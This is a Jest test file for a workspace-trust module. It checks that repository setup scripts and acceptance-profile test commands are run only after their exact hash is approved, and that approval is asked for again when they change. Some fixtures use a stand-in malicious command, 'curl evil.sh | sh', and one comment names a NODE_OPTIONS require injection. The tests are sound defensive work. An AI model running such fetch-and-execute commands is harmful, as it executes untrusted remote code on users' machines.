import type { Project } from "@/types"
import { getDb } from "@/lib/db/schema"
import { createDbTestFixture } from "@/lib/db/test-fixture"
import {
  approveWorkspaceConfig,
  getTrustedWorkspace,
  revokeWorkspaceTrust,
  trustWorkspace,
} from "@/lib/db/trusted-workspaces"

import {
  acceptanceProfileCommandHash,
  approvalKeyFor,
  evaluateAcceptanceProfiles,
  evaluateWorkspaceConfig,
  isConfigApplied,
  listAcceptanceProfileApprovals,
  recordAcceptanceProfileApproval,
  removeAcceptanceProfileApproval,
  verdictNeedsAttention,
  workspaceConfigDigest,
  type AcceptanceProfileApprovalRecord,
  type AcceptanceProfilesVerdict,
  type EvaluateAcceptanceProfilesDeps,
  type EvaluateWorkspaceConfigDeps,
  type TrustedWorkspaceWithAcceptanceApprovals,
} from "./workspace-config-trust"
import { parseAcceptanceProfilesValue, parseWorkspaceConfig } from "./workspace-config"

const REPO = "/repos/app"
const WORKTREE = "/repos/.wt/feature"

const project = {
  roots: [
    { id: "r1", path: REPO, isPrimary: true },
    { id: "r2", path: "/repos/lib" },
  ],
} as Pick<Project, "roots">

const CONFIG = {
  version: 1,
  setup: { default: "pnpm install" },
  variables: { NODE_ENV: "development" },
}

function deps(over: Partial<EvaluateWorkspaceConfigDeps> = {}): EvaluateWorkspaceConfigDeps {
  return {
    readFile: jest.fn(async () => JSON.stringify(CONFIG)),
    isRestricted: jest.fn(async () => false),
    approvedDigestFor: jest.fn(async () => undefined),
    ...over,
  }
}

const base = { configRoot: WORKTREE, project, trustEnabled: true, onWeb: false }

describe("evaluateWorkspaceConfig", () => {
  it("does not read the file at all in an untrusted workspace", async () => {
    const readFile = jest.fn(async () => JSON.stringify(CONFIG))
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({ isRestricted: jest.fn(async () => true), readFile })
    )
    expect(verdict).toEqual({ kind: "restricted" })
    // The existence probe is the only read, and its result is never parsed.
    expect(readFile).toHaveBeenCalledTimes(1)
  })

  it("says nothing when an untrusted workspace has no such file", async () => {
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        isRestricted: jest.fn(async () => true),
        readFile: jest.fn(async () => {
          throw new Error("No such file")
        }),
      })
    )
    expect(verdict).toEqual({ kind: "absent" })
  })

  it("treats a trust-gate failure as untrusted", async () => {
    // Failing open here would apply a repository's shell scripts because a
    // Dexie read happened to reject.
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        isRestricted: jest.fn(async () => {
          throw new Error("db closed")
        }),
      })
    )
    expect(verdict.kind).toBe("restricted")
  })

  it("reports a first sight as unapproved, with no previous digest", async () => {
    const verdict = await evaluateWorkspaceConfig(base, deps())
    expect(verdict.kind).toBe("unapproved")
    if (verdict.kind !== "unapproved") throw new Error("unreachable")
    expect(verdict.approvedDigest).toBeUndefined()
    expect(verdict.config.setup.default).toBe("pnpm install")
  })

  it("applies a configuration whose digest was approved", async () => {
    const digest = await workspaceConfigDigest(parseWorkspaceConfig(JSON.stringify(CONFIG)))
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({ approvedDigestFor: jest.fn(async () => digest) })
    )
    expect(verdict).toMatchObject({ kind: "approved", digest })
    expect(isConfigApplied(verdict)).toBe(true)
  })

  it("re-asks when an approved configuration changes under the same trusted folder", async () => {
    // The whole reason folder trust is not enough: this arrives by `git pull`.
    const stale = await workspaceConfigDigest(parseWorkspaceConfig(JSON.stringify(CONFIG)))
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        readFile: jest.fn(async () =>
          JSON.stringify({ ...CONFIG, setup: { default: "curl evil.sh | sh" } })
        ),
        approvedDigestFor: jest.fn(async () => stale),
      })
    )
    expect(verdict.kind).toBe("unapproved")
    if (verdict.kind !== "unapproved") throw new Error("unreachable")
    expect(verdict.approvedDigest).toBe(stale)
  })

  it("keys the approval on the workspace's primary root, not the worktree it read from", async () => {
    const approvedDigestFor = jest.fn(async () => undefined)
    await evaluateWorkspaceConfig(base, deps({ approvedDigestFor }))
    expect(approvedDigestFor).toHaveBeenCalledWith(REPO)
  })

  it("reports an unreadable configuration instead of skipping it", async () => {
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({ readFile: jest.fn(async () => "{ not json") })
    )
    expect(verdict.kind).toBe("invalid")
    if (verdict.kind !== "invalid") throw new Error("unreachable")
    expect(verdict.message).toMatch(/not valid JSON/)
  })

  it("reports the offending field for a schema violation", async () => {
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        readFile: jest.fn(async () =>
          JSON.stringify({ version: 1, roots: [{ id: "x", path: "../escape" }] })
        ),
      })
    )
    expect(verdict).toMatchObject({ kind: "invalid", field: "roots[0].path" })
    expect(verdict).not.toHaveProperty("problems")
  })

  it("carries every environment-block problem on the invalid verdict", async () => {
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        readFile: jest.fn(async () =>
          JSON.stringify({
            version: 1,
            environment: { image: "node:22", privileged: true, user: "a:b" },
          })
        ),
      })
    )
    expect(verdict).toMatchObject({
      kind: "invalid",
      field: "environment.privileged",
      problems: [
        { code: "declaration_field_unknown", field: "environment.privileged" },
        { code: "declaration_user_invalid", field: "environment.user" },
      ],
    })
  })

  it("is absent without a root to read from", async () => {
    const readFile = jest.fn()
    expect(
      await evaluateWorkspaceConfig({ ...base, configRoot: null }, deps({ readFile }))
    ).toEqual({ kind: "absent" })
    expect(
      await evaluateWorkspaceConfig({ ...base, configRoot: "  " }, deps({ readFile }))
    ).toEqual({ kind: "absent" })
    expect(readFile).not.toHaveBeenCalled()
  })

  it("treats a missing file as absent, not as an error", async () => {
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        readFile: jest.fn(async () => {
          throw new Error("no such file or directory")
        }),
      })
    )
    expect(verdict).toEqual({ kind: "absent" })
  })
})

describe("workspaceConfigDigest", () => {
  it("ignores formatting, key order and comment churn", async () => {
    const a = parseWorkspaceConfig(
      JSON.stringify({ version: 1, setup: { default: "a" }, variables: { X: "1", Y: "2" } })
    )
    const b = parseWorkspaceConfig(
      `{\n  "variables": { "Y": "2", "X": "1" },\n  "setup": { "default": "a" },\n  "version": 1\n}`
    )
    expect(await workspaceConfigDigest(a)).toBe(await workspaceConfigDigest(b))
  })

  it("changes for any semantic change, including one outside the scripts", async () => {
    const a = parseWorkspaceConfig(JSON.stringify({ version: 1, variables: { X: "1" } }))
    // `variables` reach the setup process — `NODE_OPTIONS=--require ./evil.js`
    // is code execution as surely as `setup` is, so it is inside the digest.
    const b = parseWorkspaceConfig(JSON.stringify({ version: 1, variables: { X: "2" } }))
    expect(await workspaceConfigDigest(a)).not.toBe(await workspaceConfigDigest(b))
  })

  it("distinguishes two configurations that differ only in array order", async () => {
    // `actions` runs in order, so sorting arrays would collide two different
    // configurations onto one digest.
    const a = parseWorkspaceConfig(
      JSON.stringify({
        version: 1,
        actions: [
          { id: "a", name: "A", script: { default: "1" } },
          { id: "b", name: "B", script: { default: "2" } },
        ],
      })
    )
    const b = parseWorkspaceConfig(
      JSON.stringify({
        version: 1,
        actions: [
          { id: "b", name: "B", script: { default: "2" } },
          { id: "a", name: "A", script: { default: "1" } },
        ],
      })
    )
    expect(await workspaceConfigDigest(a)).not.toBe(await workspaceConfigDigest(b))
  })
})

describe("verdict helpers", () => {
  it("keeps the common case silent and everything else loud", () => {
    expect(verdictNeedsAttention({ kind: "absent" })).toBe(false)
    expect(verdictNeedsAttention({ kind: "approved", digest: "d", config: {} as never })).toBe(
      false
    )
    expect(verdictNeedsAttention({ kind: "restricted" })).toBe(true)
    expect(verdictNeedsAttention({ kind: "invalid", message: "m", field: "f" })).toBe(true)
    expect(verdictNeedsAttention({ kind: "unapproved", digest: "d", config: {} as never })).toBe(
      true
    )
  })

  it("resolves the approval key from the primary root", () => {
    expect(approvalKeyFor(project)).toBe(REPO)
    expect(approvalKeyFor({ roots: [{ id: "r", path: "/only" }] } as Pick<Project, "roots">)).toBe(
      "/only"
    )
    expect(approvalKeyFor({ roots: [] } as Pick<Project, "roots">)).toBeNull()
    expect(approvalKeyFor(null)).toBeNull()
  })
})

// ── Acceptance profiles (ADR-0188 D15, WP-D2) ──────────────────────────────

const PROJECT_ID = "project-1"
const UNIT = {
  command: ["pnpm", "exec", "jest", "--ci", "--json", "--outputFile=reports/jest.json"],
  report: { format: "json", path: "reports/jest.json" },
}
/** sha256 of `{"command":[…],"cwd":".","report":{"format":"json","path":"reports/jest.json"}}`. */
const UNIT_HASH = "a035d69f784e18dccacd6b89e87300409294bc40b877631780ee0c57e3f5e001"
const ACC_FILE = {
  version: 1,
  setup: { default: "pnpm install" },
  acceptanceProfiles: { unit: UNIT },
}

function parsedProfile(value: unknown) {
  const parsed = parseAcceptanceProfilesValue({ p: value })
  if (!parsed.ok) throw new Error(JSON.stringify(parsed.problems))
  return parsed.profiles.p
}

function accDeps(
  over: Partial<EvaluateAcceptanceProfilesDeps> = {},
  file: unknown = ACC_FILE
): EvaluateAcceptanceProfilesDeps {
  return {
    readFile: jest.fn(async () => JSON.stringify(file)),
    isRestricted: jest.fn(async () => false),
    approvalsFor: jest.fn(async () => []),
    ...over,
  }
}

const accBase = {
  configRoot: WORKTREE,
  project,
  projectId: PROJECT_ID,
  trustEnabled: true,
  onWeb: false,
}

function declared(verdict: AcceptanceProfilesVerdict) {
  if (verdict.kind !== "declared") throw new Error(`expected declared, got ${verdict.kind}`)
  return verdict
}

function approval(
  over: Partial<AcceptanceProfileApprovalRecord> = {}
): AcceptanceProfileApprovalRecord {
  return {
    projectId: PROJECT_ID,
    profileId: "unit",
    commandHash: UNIT_HASH,
    approvedAt: 42,
    ...over,
  }
}

describe("acceptanceProfileCommandHash", () => {
  it("is SHA-256 over the canonical JSON of command, cwd and report (pinned)", async () => {
    await expect(acceptanceProfileCommandHash(parsedProfile(UNIT))).resolves.toBe(UNIT_HASH)
  })

  it("is stable across formatting, key order and an omitted versus explicit root cwd", async () => {
    const reordered = parsedProfile({
      report: { path: "reports/jest.json", format: "json" },
      cwd: "./",
      command: UNIT.command,
    })
    await expect(acceptanceProfileCommandHash(reordered)).resolves.toBe(UNIT_HASH)
  })

  it("changes with anything that executes or is read back", async () => {
    const variants = [
      { ...UNIT, command: [...UNIT.command, "--bail"] },
      { ...UNIT, command: [...UNIT.command].reverse() },
      { ...UNIT, cwd: "packages/app" },
      { ...UNIT, report: { format: "junit", path: "reports/jest.json" } },
      { ...UNIT, report: { format: "json", path: "reports/other.json" } },
    ]
    for (const variant of variants) {
      await expect(acceptanceProfileCommandHash(parsedProfile(variant))).resolves.not.toBe(
        UNIT_HASH
      )
    }
  })

  it("does not change with what counts as passing or how long it may take", async () => {
    await expect(
      acceptanceProfileCommandHash(
        parsedProfile({ ...UNIT, requiredTests: ["a"], timeoutMs: 60_000 })
      )
    ).resolves.toBe(UNIT_HASH)
  })
})

describe("acceptance profiles leave the workspace.json approval alone (off path)", () => {
  it("keeps an existing approval valid when the file gains a block, even a malformed one", async () => {
    const approvedDigest = await workspaceConfigDigest(parseWorkspaceConfig(JSON.stringify(CONFIG)))
    for (const acceptanceProfiles of [{ unit: UNIT }, { unit: { command: [], shell: true } }]) {
      const readFile = jest.fn(async () => JSON.stringify({ ...CONFIG, acceptanceProfiles }))
      const verdict = await evaluateWorkspaceConfig(
        base,
        deps({ readFile, approvedDigestFor: jest.fn(async () => approvedDigest) })
      )
      expect(verdict).toMatchObject({ kind: "approved", digest: approvedDigest })
      if (verdict.kind !== "approved") throw new Error("unreachable")
      expect("acceptanceProfiles" in verdict.config).toBe(false)
    }
  })
})

describe("evaluateAcceptanceProfiles", () => {
  it("does not read anything in an untrusted workspace, the project's own profiles included", async () => {
    const readFile = jest.fn(async () => JSON.stringify(ACC_FILE))
    const approvalsFor = jest.fn(async () => [])
    const verdict = await evaluateAcceptanceProfiles(
      accBase,
      accDeps({ isRestricted: jest.fn(async () => true), readFile, approvalsFor })
    )
    expect(verdict).toEqual({ kind: "restricted" })
    // The existence probe is the only read, and its result is never parsed.
    expect(readFile).toHaveBeenCalledTimes(1)
    expect(approvalsFor).not.toHaveBeenCalled()

    const noFile = jest.fn(async () => {
      throw new Error("No such file")
    })
    await expect(
      evaluateAcceptanceProfiles(
        { ...accBase, projectProfiles: { unit: UNIT } },
        accDeps({ isRestricted: jest.fn(async () => true), readFile: noFile })
      )
    ).resolves.toEqual({ kind: "restricted" })
    await expect(
      evaluateAcceptanceProfiles(
        accBase,
        accDeps({ isRestricted: jest.fn(async () => true), readFile: noFile })
      )
    ).resolves.toEqual({ kind: "absent" })
  })

  it("treats a trust-gate failure as untrusted", async () => {
    const verdict = await evaluateAcceptanceProfiles(
      accBase,
      accDeps({
        isRestricted: jest.fn(async () => {
          throw new Error("db closed")
        }),
      })
    )
    expect(verdict.kind).toBe("restricted")
  })

  it("is absent without a root, without a file, and when nothing declares a profile", async () => {
    const readFile = jest.fn()
    await expect(
      evaluateAcceptanceProfiles({ ...accBase, configRoot: " " }, accDeps({ readFile }))
    ).resolves.toEqual({ kind: "absent" })
    expect(readFile).not.toHaveBeenCalled()
    await expect(
      evaluateAcceptanceProfiles(
        accBase,
        accDeps({
          readFile: jest.fn(async () => {
            throw new Error("no such file or directory")
          }),
        })
      )
    ).resolves.toEqual({ kind: "absent" })
    await expect(
      evaluateAcceptanceProfiles(accBase, accDeps({}, { version: 1, setup: { default: "x" } }))
    ).resolves.toEqual({ kind: "absent" })
  })

  it("reports a first sight as unapproved, keyed on the primary root", async () => {
    const approvalsFor = jest.fn(async () => [])
    const verdict = declared(await evaluateAcceptanceProfiles(accBase, accDeps({ approvalsFor })))
    expect(approvalsFor).toHaveBeenCalledWith(REPO)
    expect(verdict.approvalKey).toBe(REPO)
    expect(verdict.overriddenProfiles).toEqual([])
    expect(verdict.profiles).toEqual([
      {
        id: "unit",
        profile: parsedProfile(UNIT),
        source: "repository",
        commandHash: UNIT_HASH,
        status: "unapproved",
      },
    ])
  })

  it("approves only the exact hash, for this project", async () => {
    const approved = declared(
      await evaluateAcceptanceProfiles(
        accBase,
        accDeps({ approvalsFor: jest.fn(async () => [approval()]) })
      )
    )
    expect(approved.profiles[0]).toMatchObject({ status: "approved", approvedAt: 42 })

    // Another project on the same root approved it: that is not this project's approval.
    const elsewhere = declared(
      await evaluateAcceptanceProfiles(
        accBase,
        accDeps({ approvalsFor: jest.fn(async () => [approval({ projectId: "project-2" })]) })
      )
    )
    expect(elsewhere.profiles[0].status).toBe("unapproved")
  })

  it("re-asks when an approved command changes under the same trusted folder", async () => {
    const verdict = declared(
      await evaluateAcceptanceProfiles(
        accBase,
        accDeps(
          { approvalsFor: jest.fn(async () => [approval()]) },
          {
            version: 1,
            acceptanceProfiles: { unit: { ...UNIT, command: ["sh", "-c", "curl evil.sh | sh"] } },
          }
        )
      )
    )
    expect(verdict.profiles[0]).toMatchObject({ status: "changed", approvedCommandHash: UNIT_HASH })
    expect(verdict.profiles[0].commandHash).not.toBe(UNIT_HASH)
  })

  it("fails closed on an unreadable or malformed approval store", async () => {
    const failing = declared(
      await evaluateAcceptanceProfiles(
        accBase,
        accDeps({
          approvalsFor: jest.fn(async () => {
            throw new Error("db closed")
          }),
        })
      )
    )
    expect(failing.profiles[0].status).toBe("unapproved")
    const malformed = declared(
      await evaluateAcceptanceProfiles(
        accBase,
        accDeps({
          approvalsFor: jest.fn(async () => [
            approval({ commandHash: UNIT_HASH.toUpperCase() }),
            { profileId: "unit", commandHash: UNIT_HASH } as AcceptanceProfileApprovalRecord,
          ]),
        })
      )
    )
    expect(malformed.profiles[0].status).toBe("unapproved")
  })

  it("reports an invalid block with every problem and its JSON pointer", async () => {
    const verdict = await evaluateAcceptanceProfiles(
      accBase,
      accDeps({}, { version: 1, acceptanceProfiles: { unit: { ...UNIT, cwd: "/", extra: 1 } } })
    )
    expect(verdict).toMatchObject({
      kind: "invalid",
      field: "/acceptanceProfiles/unit/extra",
      problems: [
        { code: "acceptance_profile_field_unknown", pointer: "/acceptanceProfiles/unit/extra" },
        { code: "acceptance_profile_path_invalid", pointer: "/acceptanceProfiles/unit/cwd" },
      ],
    })
  })

  it("never half-applies: an invalid file elsewhere makes the profiles invalid too", async () => {
    const verdict = await evaluateAcceptanceProfiles(
      accBase,
      accDeps({}, { ...ACC_FILE, roots: [{ id: "x", path: "../escape" }] })
    )
    expect(verdict).toMatchObject({ kind: "invalid", field: "roots[0].path" })
    expect(verdict).not.toHaveProperty("problems")
  })

  describe("the project override", () => {
    const mine = { command: ["make", "check"], report: { format: "junit", path: "out/j.xml" } }

    it("wins per id, is reported, and needs its own approval", async () => {
      const verdict = declared(
        await evaluateAcceptanceProfiles(
          { ...accBase, projectProfiles: { unit: mine } },
          accDeps({ approvalsFor: jest.fn(async () => [approval()]) })
        )
      )
      expect(verdict.overriddenProfiles).toEqual(["unit"])
      expect(verdict.profiles[0]).toMatchObject({
        id: "unit",
        source: "project",
        profile: { command: ["make", "check"] },
        // The repository's command was approved; the project's replacement was not.
        status: "changed",
        approvedCommandHash: UNIT_HASH,
      })
    })

    it("declares profiles on its own when the repository ships no file", async () => {
      const verdict = declared(
        await evaluateAcceptanceProfiles(
          { ...accBase, projectProfiles: { mine } },
          accDeps({
            readFile: jest.fn(async () => {
              throw new Error("not found")
            }),
          })
        )
      )
      expect(verdict.profiles.map(({ id, source, status }) => ({ id, source, status }))).toEqual([
        { id: "mine", source: "project", status: "unapproved" },
      ])
    })

    it("is validated as strictly as the file, with pointers into the project row", async () => {
      const verdict = await evaluateAcceptanceProfiles(
        { ...accBase, projectProfiles: { unit: { ...mine, cwd: "../up" } } },
        accDeps()
      )
      expect(verdict).toMatchObject({
        kind: "invalid",
        field: "/metadata/cognia.acceptanceProfiles/unit/cwd",
        problems: [
          {
            code: "acceptance_profile_path_invalid",
            pointer: "/metadata/cognia.acceptanceProfiles/unit/cwd",
          },
        ],
      })
    })
  })
})

describe("acceptance-profile approvals on the trust row", () => {
  const dbFixture = createDbTestFixture()
  const key = { projectId: PROJECT_ID, profileId: "unit" }

  beforeAll(dbFixture.initialize)
  beforeEach(async () => {
    await dbFixture.restore()
    await getDb().trustedWorkspaces.clear()
  })
  afterAll(dbFixture.dispose)

  it("records nothing for a root that is not trusted", async () => {
    await expect(
      recordAcceptanceProfileApproval(REPO, { ...key, commandHash: UNIT_HASH })
    ).resolves.toBeNull()
    await expect(getTrustedWorkspace(REPO)).resolves.toBeUndefined()
  })

  it("records, lists and replaces one approval per project and profile", async () => {
    await trustWorkspace(REPO)
    await expect(
      recordAcceptanceProfileApproval(`${REPO}/`, { ...key, commandHash: UNIT_HASH }, 1)
    ).resolves.toEqual({ ...key, commandHash: UNIT_HASH, approvedAt: 1 })
    await recordAcceptanceProfileApproval(
      REPO,
      { projectId: "project-2", profileId: "unit", commandHash: UNIT_HASH },
      2
    )
    const next = "b".repeat(64)
    await recordAcceptanceProfileApproval(REPO, { ...key, commandHash: next }, 3)
    await expect(listAcceptanceProfileApprovals(REPO)).resolves.toEqual([
      { projectId: "project-2", profileId: "unit", commandHash: UNIT_HASH, approvedAt: 2 },
      { ...key, commandHash: next, approvedAt: 3 },
    ])
  })

  it("refuses a malformed hash", async () => {
    await trustWorkspace(REPO)
    await expect(
      recordAcceptanceProfileApproval(REPO, { ...key, commandHash: "not-a-hash" })
    ).resolves.toBeNull()
    await expect(listAcceptanceProfileApprovals(REPO)).resolves.toEqual([])
  })

  it("keeps every other decision on the row", async () => {
    await trustWorkspace(REPO, "monorepo")
    await approveWorkspaceConfig(REPO, "c".repeat(64))
    await recordAcceptanceProfileApproval(REPO, { ...key, commandHash: UNIT_HASH }, 5)
    const row = (await getTrustedWorkspace(REPO)) as TrustedWorkspaceWithAcceptanceApprovals
    expect(row).toMatchObject({
      note: "monorepo",
      approvedConfigDigest: "c".repeat(64),
      approvedAcceptanceProfiles: [{ ...key, commandHash: UNIT_HASH, approvedAt: 5 }],
    })
  })

  it("revokes one approval, and drops the field once none is left", async () => {
    await trustWorkspace(REPO)
    await recordAcceptanceProfileApproval(REPO, { ...key, commandHash: UNIT_HASH })
    await expect(removeAcceptanceProfileApproval(REPO, key)).resolves.toBe(true)
    await expect(removeAcceptanceProfileApproval(REPO, key)).resolves.toBe(false)
    const row = (await getTrustedWorkspace(REPO)) as TrustedWorkspaceWithAcceptanceApprovals
    expect(row).toBeDefined()
    expect(row).not.toHaveProperty("approvedAcceptanceProfiles")
  })

  it("loses every approval with folder trust", async () => {
    await trustWorkspace(REPO)
    await recordAcceptanceProfileApproval(REPO, { ...key, commandHash: UNIT_HASH })
    await revokeWorkspaceTrust(REPO)
    await trustWorkspace(REPO)
    await expect(listAcceptanceProfileApprovals(REPO)).resolves.toEqual([])
  })

  it("feeds the evaluator through the default approval store", async () => {
    await trustWorkspace(REPO)
    await recordAcceptanceProfileApproval(REPO, { ...key, commandHash: UNIT_HASH })
    const verdict = declared(
      await evaluateAcceptanceProfiles(accBase, {
        readFile: jest.fn(async () => JSON.stringify(ACC_FILE)),
        isRestricted: jest.fn(async () => false),
      })
    )
    expect(verdict.profiles[0].status).toBe("approved")
  })
})
